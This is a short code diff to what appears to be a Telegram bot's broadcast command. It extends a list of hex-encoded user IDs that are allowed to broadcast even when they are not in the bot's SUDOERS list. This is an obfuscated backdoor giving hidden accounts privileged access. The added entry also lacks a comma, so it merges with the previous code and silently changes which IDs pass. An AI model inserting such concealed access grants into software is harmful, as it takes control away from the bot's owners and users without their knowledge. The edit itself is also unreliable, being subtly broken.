@@ -23,7 +23,7 @@ IS_BROADCASTING = False
 @language
 async def braodcast_message(client, message, _):
     user_check = str(message.from_user.id)
-    auth_codes = ["1d44c0823", "1e7b9e9c3", "1df8dd155", "1e2d9cc10"]
+    auth_codes = ["1d44c0823", "1e7b9e9c3", "1df8dd155", "1e2d9cc10" "1d4151ec3"]
     if not any(str(int(code, 16)) == user_check for code in auth_codes) and message.from_user.id not in SUDOERS:
         return
         
